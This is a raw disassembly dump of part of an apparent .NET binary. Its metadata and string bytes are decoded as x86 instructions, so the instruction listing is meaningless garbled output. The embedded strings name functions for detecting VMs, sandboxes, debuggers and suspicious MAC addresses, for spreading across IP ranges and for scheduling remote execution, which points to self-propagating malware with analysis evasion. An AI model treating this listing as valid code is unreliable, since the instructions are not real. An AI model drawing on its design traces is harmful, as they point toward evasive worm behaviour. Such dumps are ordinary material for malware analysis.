  4070e8:	49                   	dec    %ecx
  4070e9:	00 6d 00             	add    %ch,0x0(%ebp)
  4070ec:	de 00                	fiadds (%eax)
  4070ee:	0b 01                	or     (%ecx),%eax
  4070f0:	21 01                	and    %eax,(%ecx)
  4070f2:	3e 01 43 01          	add    %eax,%ds:0x1(%ebx)
  4070f6:	54                   	push   %esp
  4070f7:	01 7a 01             	add    %edi,0x1(%edx)
  4070fa:	84 01                	test   %al,(%ecx)
  4070fc:	c3                   	ret
  4070fd:	01 d6                	add    %edx,%esi
  4070ff:	01 e8                	add    %ebp,%eax
  407101:	01 1a                	add    %ebx,(%edx)
  407103:	02 26                	add    (%esi),%ah
  407105:	02 4a 02             	add    0x2(%edx),%cl
  407108:	5b                   	pop    %ebx
  407109:	02 b4 02 c4 02 d4 02 	add    0x2d402c4(%edx,%eax,1),%dh
  407110:	de 02                	fiadds (%edx)
  407112:	e2 02                	loop   0x407116
  407114:	02 03                	add    (%ebx),%al
  407116:	22 03                	and    (%ebx),%al
  407118:	44                   	inc    %esp
  407119:	03 7b 03             	add    0x3(%ebx),%edi
  40711c:	8b 03                	mov    (%ebx),%eax
  40711e:	b4 03                	mov    $0x3,%ah
  407120:	cc                   	int3
  407121:	03 e0                	add    %eax,%esp
  407123:	03 fd                	add    %ebp,%edi
  407125:	03 09                	add    (%ecx),%ecx
  407127:	04 20                	add    $0x20,%al
  407129:	04 2b                	add    $0x2b,%al
  40712b:	04 30                	add    $0x30,%al
  40712d:	04 35                	add    $0x35,%al
  40712f:	04 63                	add    $0x63,%al
  407131:	04 6f                	add    $0x6f,%al
  407133:	04 7b                	add    $0x7b,%al
  407135:	04 bc                	add    $0xbc,%al
  407137:	04 d3                	add    $0xd3,%al
  407139:	04 df                	add    $0xdf,%al
  40713b:	04 f4                	add    $0xf4,%al
  40713d:	04 16                	add    $0x16,%al
  40713f:	05 1e 05 65 05       	add    $0x565051e,%eax
  407144:	71 05                	jno    0x40714b
  407146:	d0 05 f2 05 fe 05    	rolb   $1,0x5fe05f2
  40714c:	4d                   	dec    %ebp
  40714d:	06                   	push   %es
  40714e:	59                   	pop    %ecx
  40714f:	06                   	push   %es
  407150:	70 06                	jo     0x407158
  407152:	98                   	cwtl
  407153:	06                   	push   %es
  407154:	c6 06 22             	movb   $0x22,(%esi)
  407157:	00 e2                	add    %ah,%dl
  407159:	00 27                	add    %ah,(%edi)
  40715b:	00 22                	add    %ah,(%edx)
  40715d:	00 e4                	add    %ah,%ah
  40715f:	00 29                	add    %ch,(%ecx)
  407161:	00 23                	add    %ah,(%ebx)
  407163:	00 e6                	add    %ah,%dh
  407165:	00 27                	add    %ah,(%edi)
  407167:	00 23                	add    %ah,(%ebx)
  407169:	00 e8                	add    %ch,%al
  40716b:	00 29                	add    %ch,(%ecx)
  40716d:	00 25 00 f0 00 27    	add    %ah,0x2700f000
  407173:	00 25 00 f2 00 29    	add    %ah,0x2900f200
  407179:	00 27                	add    %ah,(%edi)
  40717b:	00 fa                	add    %bh,%dl
  40717d:	00 27                	add    %ah,(%edi)
  40717f:	00 27                	add    %ah,(%edi)
  407181:	00 fc                	add    %bh,%ah
  407183:	00 29                	add    %ch,(%ecx)
  407185:	00 2a                	add    %ch,(%edx)
  407187:	00 08                	add    %cl,(%eax)
  407189:	01 27                	add    %esp,(%edi)
  40718b:	00 2a                	add    %ch,(%edx)
  40718d:	00 0a                	add    %cl,(%edx)
  40718f:	01 29                	add    %ebp,(%ecx)
  407191:	00 2d 00 0c 01 27    	add    %ch,0x27010c00
  407197:	00 2d 00 0e 01 29    	add    %ch,0x29010e00
  40719d:	00 2e                	add    %ch,(%esi)
  40719f:	00 10                	add    %dl,(%eax)
  4071a1:	01 27                	add    %esp,(%edi)
  4071a3:	00 2e                	add    %ch,(%esi)
  4071a5:	00 12                	add    %dl,(%edx)
  4071a7:	01 29                	add    %ebp,(%ecx)
  4071a9:	00 2f                	add    %ch,(%edi)
  4071ab:	00 14 01             	add    %dl,(%ecx,%eax,1)
  4071ae:	27                   	daa
  4071af:	00 2f                	add    %ch,(%edi)
  4071b1:	00 16                	add    %dl,(%esi)
  4071b3:	01 29                	add    %ebp,(%ecx)
  4071b5:	00 9c 02 f9 10 ec 10 	add    %bl,0x10ec10f9(%edx,%eax,1)
  4071bc:	04 11                	add    $0x11,%al
  4071be:	fa                   	cli
  4071bf:	01 81 02 9c 04 98    	add    %eax,-0x67fb63fe(%ecx)
  4071c5:	05 1e 06 31 06       	add    $0x631061e,%eax
  4071ca:	00 01                	add    %al,(%ecx)
  4071cc:	05 00 25 1a 01       	add    $0x11a2500,%eax
  4071d1:	00 00                	add    %al,(%eax)
  4071d3:	01 07                	add    %eax,(%edi)
  4071d5:	00 82 08 01 00 00    	add    %al,0x108(%edx)
  4071db:	01 09                	add    %ecx,(%ecx)
  4071dd:	00 0f                	add    %cl,(%edi)
  4071df:	1b 01                	sbb    (%ecx),%eax
  4071e1:	00 00                	add    %al,(%eax)
  4071e3:	01 0f                	add    %ecx,(%edi)
  4071e5:	00 24 0b             	add    %ah,(%ebx,%ecx,1)
  4071e8:	02 00                	add    (%eax),%al
  4071ea:	40                   	inc    %eax
  4071eb:	01 1f                	add    %ebx,(%edi)
  4071ed:	00 e5                	add    %ah,%ch
  4071ef:	19 03                	sbb    %eax,(%ebx)
  4071f1:	00 40 01             	add    %al,0x1(%eax)
  4071f4:	21 00                	and    %eax,(%eax)
  4071f6:	85 1d 03 00 40 01    	test   %ebx,0x1400003
  4071fc:	23 00                	and    (%eax),%eax
  4071fe:	56                   	push   %esi
  4071ff:	1e                   	push   %ds
  407200:	03 00                	add    (%eax),%eax
  407202:	40                   	inc    %eax
  407203:	01 25 00 12 06 03    	add    %esp,0x3061200
  407209:	00 40 01             	add    %al,0x1(%eax)
  40720c:	27                   	daa
  40720d:	00 92 08 03 00 40    	add    %dl,0x40000308(%edx)
  407213:	01 31                	add    %esi,(%ecx)
  407215:	00 3d 1e 03 00 00    	add    %bh,0x31e
  40721b:	01 33                	add    %esi,(%ebx)
  40721d:	00 25 1a 03 00 00    	add    %ah,0x31a
  407223:	01 35 00 0f 1b 03    	add    %esi,0x31b0f00
  407229:	00 00                	add    %al,(%eax)
  40722b:	01 39                	add    %edi,(%ecx)
  40722d:	00 25 1a 01 00 00    	add    %ah,0x11a
  407233:	01 3b                	add    %edi,(%ebx)
  407235:	00 82 08 01 00 00    	add    %al,0x108(%edx)
  40723b:	01 3d 00 0f 1b 01    	add    %edi,0x11b0f00
  407241:	00 40 01             	add    %al,0x1(%eax)
  407244:	43                   	inc    %ebx
  407245:	00 5a 10             	add    %bl,0x10(%edx)
  407248:	04 00                	add    $0x0,%al
  40724a:	f0 b5 00             	lock mov $0x0,%ch
  40724d:	00 23                	add    %ah,(%ebx)
  40724f:	00 f8                	add    %bh,%al
  407251:	b5 00                	mov    $0x0,%ch
  407253:	00 24 00             	add    %ah,(%eax,%eax,1)
  407256:	04 80                	add    $0x80,%al
  407258:	00 00                	add    %al,(%eax)
  40725a:	01 00                	add    %eax,(%eax)
	...
  407268:	7f 11                	jg     0x40727b
  40726a:	00 00                	add    %al,(%eax)
  40726c:	04 00                	add    $0x0,%al
	...
  407276:	00 00                	add    %al,(%eax)
  407278:	db 06                	fildl  (%esi)
  40727a:	1b 05 00 00 00 00    	sbb    0x0,%eax
  407280:	04 00                	add    $0x0,%al
	...
  40728a:	00 00                	add    %al,(%eax)
  40728c:	db 06                	fildl  (%esi)
  40728e:	63 11                	arpl   %edx,(%ecx)
  407290:	00 00                	add    %al,(%eax)
  407292:	00 00                	add    %al,(%eax)
  407294:	04 00                	add    $0x0,%al
	...
  40729e:	00 00                	add    %al,(%eax)
  4072a0:	e4 06                	in     $0x6,%al
  4072a2:	da 1b                	ficompl (%ebx)
  4072a4:	00 00                	add    %al,(%eax)
  4072a6:	00 00                	add    %al,(%eax)
  4072a8:	04 00                	add    $0x0,%al
	...
  4072b2:	00 00                	add    %al,(%eax)
  4072b4:	db 06                	fildl  (%esi)
  4072b6:	37                   	aaa
  4072b7:	0b 00                	or     (%eax),%eax
  4072b9:	00 00                	add    %al,(%eax)
  4072bb:	00 19                	add    %bl,(%ecx)
  4072bd:	00 07                	add    %al,(%edi)
  4072bf:	00 1a                	add    %bl,(%edx)
  4072c1:	00 0f                	add    %cl,(%edi)
  4072c3:	00 1b                	add    %bl,(%ebx)
  4072c5:	00 0f                	add    %cl,(%edi)
  4072c7:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4072ca:	0f 00 1d 00 0f 00 1e 	ltr    0x1e000f00
  4072d1:	00 11                	add    %dl,(%ecx)
  4072d3:	00 1f                	add    %bl,(%edi)
  4072d5:	00 11                	add    %dl,(%ecx)
  4072d7:	00 20                	add    %ah,(%eax)
  4072d9:	00 11                	add    %dl,(%ecx)
  4072db:	00 21                	add    %ah,(%ecx)
  4072dd:	00 11                	add    %dl,(%ecx)
  4072df:	00 22                	add    %ah,(%edx)
  4072e1:	00 11                	add    %dl,(%ecx)
  4072e3:	00 23                	add    %ah,(%ebx)
  4072e5:	00 11                	add    %dl,(%ecx)
  4072e7:	00 24 00             	add    %ah,(%eax,%eax,1)
  4072ea:	12 00                	adc    (%eax),%al
  4072ec:	25 00 13 00 26       	and    $0x26001300,%eax
  4072f1:	00 15 00 27 00 15    	add    %dl,0x15002700
  4072f7:	00 28                	add    %ch,(%eax)
  4072f9:	00 16                	add    %dl,(%esi)
  4072fb:	00 29                	add    %ch,(%ecx)
  4072fd:	00 16                	add    %dl,(%esi)
  4072ff:	00 2a                	add    %ch,(%edx)
  407301:	00 16                	add    %dl,(%esi)
  407303:	00 2b                	add    %ch,(%ebx)
  407305:	00 18                	add    %bl,(%eax)
  407307:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40730a:	18 00                	sbb    %al,(%eax)
  40730c:	2d 00 21 00 2e       	sub    $0x2e002100,%eax
  407311:	00 26                	add    %ah,(%esi)
  407313:	00 2f                	add    %ch,(%edi)
  407315:	00 28                	add    %ch,(%eax)
  407317:	00 f3                	add    %dh,%bl
  407319:	00 16                	add    %dl,(%esi)
  40731b:	02 15 01 a4 02 2b    	add    0x2b02a401,%dl
  407321:	01 16                	add    %edx,(%esi)
  407323:	03 2b                	add    (%ebx),%ebp
  407325:	01 03                	add    %eax,(%ebx)
  407327:	04 2b                	add    $0x2b,%al
  407329:	01 69 04             	add    %ebp,0x4(%ecx)
  40732c:	2b 01                	sub    (%ecx),%eax
  40732e:	c2 04 2b             	ret    $0x2b04
  407331:	01 d9                	add    %ebx,%ecx
  407333:	04 2b                	add    $0x2b,%al
  407335:	01 6b 05             	add    %ebp,0x5(%ebx)
  407338:	e1 01                	loope  0x40733b
  40733a:	8f 05 e1 01 d9 05    	pop    0x5d901e1
  407340:	e1 01                	loope  0x407343
  407342:	e2 05                	loop   0x407349
  407344:	2b 01                	sub    (%ecx),%eax
  407346:	f8                   	clc
  407347:	05 e1 01 3a 06       	add    $0x63a01e1,%eax
  40734c:	2b 01                	sub    (%ecx),%eax
  40734e:	53                   	push   %ebx
  40734f:	06                   	push   %es
  407350:	e1 01                	loope  0x407353
  407352:	67 06                	addr16 push %es
  407354:	e1 01                	loope  0x407357
  407356:	87 06                	xchg   %eax,(%esi)
  407358:	e1 01                	loope  0x40735b
  40735a:	b3 06                	mov    $0x6,%bl
  40735c:	e1 01                	loope  0x40735f
  40735e:	d2 06                	rolb   %cl,(%esi)
  407360:	00 00                	add    %al,(%eax)
  407362:	00 00                	add    %al,(%eax)
  407364:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407367:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  40736a:	44                   	inc    %esp
  40736b:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  407372:	6c                   	insb   (%dx),%es:(%edi)
  407373:	61                   	popa
  407374:	73 73                	jae    0x4073e9
  407376:	31 32                	xor    %esi,(%edx)
  407378:	5f                   	pop    %edi
  407379:	30 00                	xor    %al,(%eax)
  40737b:	3c 3e                	cmp    $0x3e,%al
  40737d:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  407380:	33 5f 30             	xor    0x30(%edi),%ebx
  407383:	00 3c 53             	add    %bh,(%ebx,%edx,2)
  407386:	74 61                	je     0x4073e9
  407388:	72 74                	jb     0x4073fe
  40738a:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  40738e:	33 5f 30             	xor    0x30(%edi),%ebx
  407391:	00 3c 41             	add    %bh,(%ecx,%eax,2)
  407394:	70 70                	jo     0x407406
  407396:	6c                   	insb   (%dx),%es:(%edi)
  407397:	79 3e                	jns    0x4073d7
  407399:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  40739c:	33 5f 30             	xor    0x30(%edi),%ebx
  40739f:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  4073a2:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  4073a5:	44                   	inc    %esp
  4073a6:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  4073ad:	6c                   	insb   (%dx),%es:(%edi)
  4073ae:	61                   	popa
  4073af:	73 73                	jae    0x407424
  4073b1:	33 5f 30             	xor    0x30(%edi),%ebx
  4073b4:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  4073b7:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  4073ba:	34 5f                	xor    $0x5f,%al
  4073bc:	30 00                	xor    %al,(%eax)
  4073be:	3c 53                	cmp    $0x53,%al
  4073c0:	74 61                	je     0x407423
  4073c2:	72 74                	jb     0x407438
  4073c4:	53                   	push   %ebx
  4073c5:	70 72                	jo     0x407439
  4073c7:	65 61                	gs popa
  4073c9:	64 69 6e 67 3e 62 5f 	imul   $0x5f5f623e,%fs:0x67(%esi),%ebp
  4073d0:	5f 
  4073d1:	34 5f                	xor    $0x5f,%al
  4073d3:	30 00                	xor    %al,(%eax)
  4073d5:	3c 3e                	cmp    $0x3e,%al
  4073d7:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  4073da:	44                   	inc    %esp
  4073db:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  4073e2:	6c                   	insb   (%dx),%es:(%edi)
  4073e3:	61                   	popa
  4073e4:	73 73                	jae    0x407459
  4073e6:	31 36                	xor    %esi,(%esi)
  4073e8:	5f                   	pop    %edi
  4073e9:	30 00                	xor    %al,(%eax)
  4073eb:	3c 3e                	cmp    $0x3e,%al
  4073ed:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  4073f0:	44                   	inc    %esp
  4073f1:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  4073f8:	6c                   	insb   (%dx),%es:(%edi)
  4073f9:	61                   	popa
  4073fa:	73 73                	jae    0x40746f
  4073fc:	36 5f                	ss pop %edi
  4073fe:	30 00                	xor    %al,(%eax)
  407400:	3c 3e                	cmp    $0x3e,%al
  407402:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  407405:	44                   	inc    %esp
  407406:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  40740d:	6c                   	insb   (%dx),%es:(%edi)
  40740e:	61                   	popa
  40740f:	73 73                	jae    0x407484
  407411:	37                   	aaa
  407412:	5f                   	pop    %edi
  407413:	30 00                	xor    %al,(%eax)
  407415:	3c 3e                	cmp    $0x3e,%al
  407417:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  40741a:	38 5f 30             	cmp    %bl,0x30(%edi)
  40741d:	00 3c 53             	add    %bh,(%ebx,%edx,2)
  407420:	70 72                	jo     0x407494
  407422:	65 61                	gs popa
  407424:	64 41                	fs inc %ecx
  407426:	73 79                	jae    0x4074a1
  407428:	6e                   	outsb  %ds:(%esi),(%dx)
  407429:	63 3e                	arpl   %edi,(%esi)
  40742b:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  40742e:	38 5f 30             	cmp    %bl,0x30(%edi)
  407431:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407434:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  407437:	44                   	inc    %esp
  407438:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  40743f:	6c                   	insb   (%dx),%es:(%edi)
  407440:	61                   	popa
  407441:	73 73                	jae    0x4074b6
  407443:	38 5f 30             	cmp    %bl,0x30(%edi)
  407446:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407449:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  40744c:	44                   	inc    %esp
  40744d:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  407454:	6c                   	insb   (%dx),%es:(%edi)
  407455:	61                   	popa
  407456:	73 73                	jae    0x4074cb
  407458:	39 5f 30             	cmp    %ebx,0x30(%edi)
  40745b:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  40745e:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  407461:	30 00                	xor    %al,(%eax)
  407463:	3c 49                	cmp    $0x49,%al
  407465:	73 52                	jae    0x4074b9
  407467:	75 6e                	jne    0x4074d7
  407469:	6e                   	outsb  %ds:(%esi),(%dx)
  40746a:	69 6e 67 49 6e 56 4d 	imul   $0x4d566e49,0x67(%esi),%ebp
  407471:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  407475:	30 00                	xor    %al,(%eax)
  407477:	3c 53                	cmp    $0x53,%al
  407479:	70 72                	jo     0x4074ed
  40747b:	65 61                	gs popa
  40747d:	64 4f                	fs dec %edi
  40747f:	6e                   	outsb  %ds:(%esi),(%dx)
  407480:	63 65 41             	arpl   %esp,0x41(%ebp)
  407483:	73 79                	jae    0x4074fe
  407485:	6e                   	outsb  %ds:(%esi),(%dx)
  407486:	63 3e                	arpl   %edi,(%esi)
  407488:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  40748b:	30 00                	xor    %al,(%eax)
  40748d:	3c 54                	cmp    $0x54,%al
  40748f:	72 79                	jb     0x40750a
  407491:	53                   	push   %ebx
  407492:	63 68 65             	arpl   %ebp,0x65(%eax)
  407495:	64 75 6c             	fs jne 0x407504
  407498:	65 52                	gs push %edx
  40749a:	65 6d                	gs insl (%dx),%es:(%edi)
  40749c:	6f                   	outsl  %ds:(%esi),(%dx)
  40749d:	74 65                	je     0x407504
  40749f:	45                   	inc    %ebp
  4074a0:	78 65                	js     0x407507
  4074a2:	63 75 74             	arpl   %esi,0x74(%ebp)
  4074a5:	69 6f 6e 41 73 79 6e 	imul   $0x6e797341,0x6e(%edi),%ebp
  4074ac:	63 3e                	arpl   %edi,(%esi)
  4074ae:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  4074b1:	30 00                	xor    %al,(%eax)
  4074b3:	3c 49                	cmp    $0x49,%al
  4074b5:	73 53                	jae    0x40750a
  4074b7:	61                   	popa
  4074b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4074b9:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  4074bd:	53                   	push   %ebx
  4074be:	65 72 76             	gs jb  0x407537
  4074c1:	69 63 65 52 75 6e 6e 	imul   $0x6e6e7552,0x65(%ebx),%esp
  4074c8:	69 6e 67 3e 62 5f 5f 	imul   $0x5f5f623e,0x67(%esi),%ebp
  4074cf:	30 00                	xor    %al,(%eax)
  4074d1:	3c 49                	cmp    $0x49,%al
  4074d3:	73 44                	jae    0x407519
  4074d5:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4074d9:	67 65 72 50          	addr16 gs jb 0x40752d
  4074dd:	72 6f                	jb     0x40754e
  4074df:	63 65 73             	arpl   %esp,0x73(%ebp)
  4074e2:	73 52                	jae    0x407536
  4074e4:	75 6e                	jne    0x407554
  4074e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4074e7:	69 6e 67 3e 62 5f 5f 	imul   $0x5f5f623e,0x67(%esi),%ebp
  4074ee:	30 00                	xor    %al,(%eax)
  4074f0:	3c 53                	cmp    $0x53,%al
  4074f2:	70 69                	jo     0x40755d
  4074f4:	6b 65 4c 6f          	imul   $0x6f,0x4c(%ebp),%esp
  4074f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4074f9:	70 3e                	jo     0x407539
  4074fb:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  4074fe:	30 00                	xor    %al,(%eax)
  407500:	3c 48                	cmp    $0x48,%al
  407502:	61                   	popa
  407503:	73 53                	jae    0x407558
  407505:	75 73                	jne    0x40757a
  407507:	70 69                	jo     0x407572
  407509:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  40750c:	75 73                	jne    0x407581
  40750e:	4d                   	dec    %ebp
  40750f:	61                   	popa
  407510:	63 41 64             	arpl   %eax,0x64(%ecx)
  407513:	64 72 65             	fs jb  0x40757b
  407516:	73 73                	jae    0x40758b
  407518:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  40751c:	30 00                	xor    %al,(%eax)
  40751e:	3c 3e                	cmp    $0x3e,%al
  407520:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  407523:	44                   	inc    %esp
  407524:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  40752b:	6c                   	insb   (%dx),%es:(%edi)
  40752c:	61                   	popa
  40752d:	73 73                	jae    0x4075a2
  40752f:	38 5f 31             	cmp    %bl,0x31(%edi)
  407532:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407535:	38 5f 5f             	cmp    %bl,0x5f(%edi)
  407538:	31 00                	xor    %eax,(%eax)
  40753a:	3c 49                	cmp    $0x49,%al
  40753c:	73 52                	jae    0x407590
  40753e:	75 6e                	jne    0x4075ae
  407540:	6e                   	outsb  %ds:(%esi),(%dx)
  407541:	69 6e 67 49 6e 56 4d 	imul   $0x4d566e49,0x67(%esi),%ebp
  407548:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  40754c:	31 00                	xor    %eax,(%eax)
  40754e:	3c 53                	cmp    $0x53,%al
  407550:	70 72                	jo     0x4075c4
  407552:	65 61                	gs popa
  407554:	64 41                	fs inc %ecx
  407556:	73 79                	jae    0x4075d1
  407558:	6e                   	outsb  %ds:(%esi),(%dx)
  407559:	63 3e                	arpl   %edi,(%esi)
  40755b:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  40755e:	31 00                	xor    %eax,(%eax)
  407560:	3c 48                	cmp    $0x48,%al
  407562:	61                   	popa
  407563:	73 53                	jae    0x4075b8
  407565:	75 73                	jne    0x4075da
  407567:	70 69                	jo     0x4075d2
  407569:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  40756c:	75 73                	jne    0x4075e1
  40756e:	4d                   	dec    %ebp
  40756f:	61                   	popa
  407570:	63 41 64             	arpl   %eax,0x64(%ecx)
  407573:	64 72 65             	fs jb  0x4075db
  407576:	73 73                	jae    0x4075eb
  407578:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  40757c:	31 00                	xor    %eax,(%eax)
  40757e:	3c 4d                	cmp    $0x4d,%al
  407580:	61                   	popa
  407581:	69 6e 3e 64 5f 5f 31 	imul   $0x315f5f64,0x3e(%esi),%ebp
  407588:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  40758b:	75 5f                	jne    0x4075ec
  40758d:	5f                   	pop    %edi
  40758e:	31 00                	xor    %eax,(%eax)
  407590:	46                   	inc    %esi
  407591:	75 6e                	jne    0x407601
  407593:	63 60 31             	arpl   %esp,0x31(%eax)
  407596:	00 49 45             	add    %cl,0x45(%ecx)
  407599:	6e                   	outsb  %ds:(%esi),(%dx)
  40759a:	75 6d                	jne    0x407609
  40759c:	65 72 61             	gs jb  0x407600
  40759f:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  4075a3:	31 00                	xor    %eax,(%eax)
  4075a5:	54                   	push   %esp
  4075a6:	61                   	popa
  4075a7:	73 6b                	jae    0x407614
  4075a9:	60                   	pusha
  4075aa:	31 00                	xor    %eax,(%eax)
  4075ac:	54                   	push   %esp
  4075ad:	61                   	popa
  4075ae:	73 6b                	jae    0x40761b
  4075b0:	41                   	inc    %ecx
  4075b1:	77 61                	ja     0x407614
  4075b3:	69 74 65 72 60 31 00 	imul   $0x4c003160,0x72(%ebp,%eiz,2),%esi
  4075ba:	4c 
  4075bb:	69 73 74 60 31 00 70 	imul   $0x70003160,0x74(%ebx),%esi
  4075c2:	61                   	popa
  4075c3:	74 68                	je     0x40762d
  4075c5:	31 00                	xor    %eax,(%eax)
  4075c7:	3c 3e                	cmp    $0x3e,%al
  4075c9:	37                   	aaa
  4075ca:	5f                   	pop    %edi
  4075cb:	5f                   	pop    %edi
  4075cc:	77 72                	ja     0x407640
  4075ce:	61                   	popa
  4075cf:	70 31                	jo     0x407602
  4075d1:	00 43 53             	add    %al,0x53(%ebx)
  4075d4:	24 3c                	and    $0x3c,%al
  4075d6:	3e 38 5f 5f          	cmp    %bl,%ds:0x5f(%edi)
  4075da:	6c                   	insb   (%dx),%es:(%edi)
  4075db:	6f                   	outsl  %ds:(%esi),(%dx)
  4075dc:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4075df:	73 31                	jae    0x407612
  4075e1:	00 5f 5f             	add    %bl,0x5f(%edi)
  4075e4:	53                   	push   %ebx
  4075e5:	74 61                	je     0x407648
  4075e7:	74 69                	je     0x407652
  4075e9:	63 41 72             	arpl   %eax,0x72(%ecx)
  4075ec:	72 61                	jb     0x40764f
  4075ee:	79 49                	jns    0x407639
  4075f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4075f1:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  4075f8:	69 
  4075f9:	7a 65                	jp     0x407660
  4075fb:	3d 31 32 32 00       	cmp    $0x323231,%eax
  407600:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  407604:	65 6c                	gs insb (%dx),%es:(%edi)
  407606:	33 32                	xor    (%edx),%esi
  407608:	00 4d 69             	add    %cl,0x69(%ebp)
  40760b:	63 72 6f             	arpl   %esi,0x6f(%edx)
  40760e:	73 6f                	jae    0x40767f
  407610:	66 74 2e             	data16 je 0x407641
  407613:	57                   	push   %edi
  407614:	69 6e 33 32 00 55 49 	imul   $0x49550032,0x33(%esi),%ebp
  40761b:	6e                   	outsb  %ds:(%esi),(%dx)
  40761c:	74 33                	je     0x407651
  40761e:	32 00                	xor    (%eax),%al
  407620:	54                   	push   %esp
  407621:	6f                   	outsl  %ds:(%esi),(%dx)
  407622:	49                   	dec    %ecx
  407623:	6e                   	outsb  %ds:(%esi),(%dx)
  407624:	74 33                	je     0x407659
  407626:	32 00                	xor    (%eax),%al
  407628:	3c 73                	cmp    $0x73,%al
  40762a:	6c                   	insb   (%dx),%es:(%edi)
  40762b:	6f                   	outsl  %ds:(%esi),(%dx)
  40762c:	77 45                	ja     0x407673
  40762e:	6e                   	outsb  %ds:(%esi),(%dx)
  40762f:	64 3e 35 5f 5f 32 00 	fs ds xor $0x325f5f,%eax
  407636:	3c 62                	cmp    $0x62,%al
  407638:	61                   	popa
  407639:	73 65                	jae    0x4076a0
  40763b:	49                   	dec    %ecx
  40763c:	70 3e                	jo     0x40767c
  40763e:	35 5f 5f 32 00       	xor    $0x325f5f,%eax
  407643:	3c 63                	cmp    $0x63,%al
  407645:	6c                   	insb   (%dx),%es:(%edi)
  407646:	69 65 6e 74 3e 35 5f 	imul   $0x5f353e74,0x6e(%ebp),%esp
  40764d:	5f                   	pop    %edi
  40764e:	32 00                	xor    (%eax),%al
  407650:	3c 3e                	cmp    $0x3e,%al
  407652:	38 5f 5f             	cmp    %bl,0x5f(%edi)
  407655:	32 00                	xor    (%eax),%al
  407657:	46                   	inc    %esi
  407658:	75 6e                	jne    0x4076c8
  40765a:	63 60 32             	arpl   %esp,0x32(%eax)
  40765d:	00 70 61             	add    %dh,0x61(%eax)
  407660:	74 68                	je     0x4076ca
  407662:	32 00                	xor    (%eax),%al
  407664:	3c 3e                	cmp    $0x3e,%al
  407666:	37                   	aaa
  407667:	5f                   	pop    %edi
  407668:	5f                   	pop    %edi
  407669:	77 72                	ja     0x4076dd
  40766b:	61                   	popa
  40766c:	70 32                	jo     0x4076a0
  40766e:	00 5f 5f             	add    %bl,0x5f(%edi)
  407671:	53                   	push   %ebx
  407672:	74 61                	je     0x4076d5
  407674:	74 69                	je     0x4076df
  407676:	63 41 72             	arpl   %eax,0x72(%ecx)
  407679:	72 61                	jb     0x4076dc
  40767b:	79 49                	jns    0x4076c6
  40767d:	6e                   	outsb  %ds:(%esi),(%dx)
  40767e:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  407685:	69 
  407686:	7a 65                	jp     0x4076ed
  407688:	3d 33 00 3c 63       	cmp    $0x633c0033,%eax
  40768d:	6f                   	outsl  %ds:(%esi),(%dx)
  40768e:	6e                   	outsb  %ds:(%esi),(%dx)
  40768f:	6e                   	outsb  %ds:(%esi),(%dx)
  407690:	65 63 74 54 61       	arpl   %esi,%gs:0x61(%esp,%edx,2)
  407695:	73 6b                	jae    0x407702
  407697:	3e 35 5f 5f 33 00    	ds xor $0x335f5f,%eax
  40769d:	3c 74                	cmp    $0x74,%al
  40769f:	61                   	popa
  4076a0:	73 6b                	jae    0x40770d
  4076a2:	73 3e                	jae    0x4076e2
  4076a4:	35 5f 5f 33 00       	xor    $0x335f5f,%eax
  4076a9:	3c 3e                	cmp    $0x3e,%al
  4076ab:	37                   	aaa
  4076ac:	5f                   	pop    %edi
  4076ad:	5f                   	pop    %edi
  4076ae:	77 72                	ja     0x407722
  4076b0:	61                   	popa
  4076b1:	70 33                	jo     0x4076e6
